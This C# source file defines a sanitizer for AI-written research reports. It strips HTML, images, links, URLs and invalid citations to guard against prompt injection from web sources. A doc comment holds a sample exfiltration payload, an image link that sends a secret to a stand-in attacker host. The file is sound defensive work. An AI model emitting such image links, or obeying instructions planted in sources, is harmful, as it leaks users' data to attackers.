using System.Globalization;
using System.Text.RegularExpressions;
using Research.Shared.Kernel.Security;

namespace Research.Synthesis.Domain.Policies;

/// <summary>What <see cref="ReportSanitizer"/> removed. Anything non-zero means the model broke its output rules,
/// which usually means a source tried to steer it.</summary>
public sealed record ReportRemovals(int Html, int Images, int Links, int Urls, int UnknownCitations)
{
    public int Total => Html + Images + Links + Urls + UnknownCitations;

    public override string ToString() => string.Create(
        CultureInfo.InvariantCulture,
        $"html {Html}, images {Images}, links {Links}, urls {Urls}, unknown citations {UnknownCitations}");
}

/// <summary>The report as stored and served, and what was taken out of it.</summary>
public sealed record SanitizedReport(string Content, ReportRemovals Removals);

/// <summary>
/// Makes the model's Markdown safe to store and render (OWASP LLM05 improper output handling, ASI01, ASI09). The
/// report is model output written from web text, so it is treated as untrusted:
/// <list type="bullet">
/// <item>invisible Unicode is removed (<see cref="UntrustedText.Clean"/>);</item>
/// <item>HTML tags and comments are removed, so a renderer never runs markup or scripts;</item>
/// <item>images become their alt text, so rendering the report never fetches a URL (the zero-click exfiltration
/// path: <c>![x](https://attacker/?q=secret)</c>);</item>
/// <item>links become their text and bare URLs are removed: the sources are attached as citations, so the text
/// never needs a URL, and a link planted by a page cannot be presented to the reader as the report's advice;</item>
/// <item><c>[n]</c> markers for numbers that are not sources are removed, so every citation points at a real
/// excerpt (OWASP LLM09).</item>
/// </list>
/// </summary>
public static partial class ReportSanitizer
{
    private const string LinkRemoved = "(link removed)";

    public static SanitizedReport Sanitize(string report, IReadOnlyCollection<int> sourceNumbers)
    {
        ArgumentNullException.ThrowIfNull(sourceNumbers);
        var text = UntrustedText.Clean(report);
        int html = 0, images = 0, links = 0, urls = 0, unknown = 0;

        text = HtmlComment().Replace(text, _ => { html++; return string.Empty; });
        text = InlineImage().Replace(text, m => { images++; return m.Groups["alt"].Value; });
        text = ReferenceImage().Replace(text, m => { images++; return m.Groups["alt"].Value; });
        text = InlineLink().Replace(text, m => { links++; return m.Groups["text"].Value; });
        text = ReferenceDefinition().Replace(text, _ => { links++; return string.Empty; });
        text = AutoLink().Replace(text, _ => { urls++; return LinkRemoved; });
        text = HtmlTag().Replace(text, _ => { html++; return string.Empty; });
        text = BareUrl().Replace(text, _ => { urls++; return LinkRemoved; });
        text = CitationBuilder.CitationMarker().Replace(text, m =>
        {
            if (sourceNumbers.Contains(int.Parse(m.Groups["num"].Value, CultureInfo.InvariantCulture)))
            {
                return m.Value;
            }

            unknown++;
            return string.Empty;
        });

        return new SanitizedReport(text.Trim(), new ReportRemovals(html, images, links, urls, unknown));
    }

    [GeneratedRegex(@"<!--[\s\S]*?(?:-->|$)", RegexOptions.CultureInvariant | RegexOptions.ExplicitCapture, matchTimeoutMilliseconds: 1000)]
    private static partial Regex HtmlComment();

    [GeneratedRegex(@"!\[(?<alt>[^\]\n]{0,500})\]\([^)\n]{0,2000}\)", RegexOptions.CultureInvariant, matchTimeoutMilliseconds: 1000)]
    private static partial Regex InlineImage();

    [GeneratedRegex(@"!\[(?<alt>[^\]\n]{0,500})\]\[[^\]\n]{0,200}\]", RegexOptions.CultureInvariant, matchTimeoutMilliseconds: 1000)]
    private static partial Regex ReferenceImage();

    [GeneratedRegex(@"\[(?<text>[^\]\n]{1,500})\]\([^)\n]{0,2000}\)", RegexOptions.CultureInvariant, matchTimeoutMilliseconds: 1000)]
    private static partial Regex InlineLink();

    [GeneratedRegex(@"^[ \t]{0,3}\[[^\]\n]{1,200}\]:[ \t]*\S+[^\n]*$", RegexOptions.Multiline | RegexOptions.CultureInvariant, matchTimeoutMilliseconds: 1000)]
    private static partial Regex ReferenceDefinition();

    [GeneratedRegex(@"<[A-Za-z][A-Za-z0-9+.-]{1,20}:[^<>\s]{0,2000}>", RegexOptions.CultureInvariant, matchTimeoutMilliseconds: 1000)]
    private static partial Regex AutoLink();

    [GeneratedRegex(@"</?[A-Za-z][A-Za-z0-9-]{0,30}(?:\s[^<>]{0,2000})?/?>", RegexOptions.CultureInvariant | RegexOptions.ExplicitCapture, matchTimeoutMilliseconds: 1000)]
    private static partial Regex HtmlTag();

    [GeneratedRegex(@"\b(?:(?:https?|ftp|file|javascript|data|vbscript):|www\.)[^\s<>()\[\]]{1,2000}", RegexOptions.IgnoreCase | RegexOptions.CultureInvariant, matchTimeoutMilliseconds: 1000)]
    private static partial Regex BareUrl();
}
